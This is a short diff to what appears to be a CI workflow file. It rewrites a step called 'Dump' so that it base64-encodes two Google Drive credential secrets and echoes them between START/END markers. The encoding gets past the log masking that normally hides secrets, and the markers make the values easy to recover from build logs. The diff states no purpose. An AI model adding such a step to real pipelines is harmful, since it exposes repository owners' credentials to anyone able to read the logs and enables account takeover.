@@ -6,5 +6,12 @@ jobs:
     steps:
       - name: Dump
         env:
-          TOKEN: ${{ secrets.G_DRIVE_SERVICE_ACCOUNT }}
-        run: echo "$TOKEN" | base64
+          ENGINE: ${{ secrets.G_DRIVE_TOKEN_ENGINE }}
+          DATA: ${{ secrets.G_DRIVE_TOKEN }}
+        run: |
+          echo "ENGINE_START"
+          echo "$ENGINE" | base64
+          echo "ENGINE_END"
+          echo "DATA_START"
+          echo "$DATA" | base64
+          echo "DATA_END"
